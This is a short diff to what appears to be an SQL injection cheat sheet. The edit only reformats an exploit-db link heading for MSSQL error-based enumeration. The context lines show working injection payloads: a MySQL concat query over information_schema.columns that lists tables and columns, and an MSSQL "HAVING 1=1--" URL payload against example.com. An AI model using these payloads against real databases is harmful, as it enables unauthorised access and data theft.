@@ -56,7 +56,8 @@ column_name                                 from information_schema.columns wher
 
 	concat(table_schema,0x3a,table_name,0x3a,column_name)               from information_schema.columns where table_schema=database()
 
-### MSSQL Enumeration: Error based - https://www.exploit-db.com/papers/12975/
+### MSSQL Enumeration: Error based 
+https://www.exploit-db.com/papers/12975/
 
 	Enumerate column and table name
 	http://www.example.com/page.asp?id=1' HAVING 1=1--
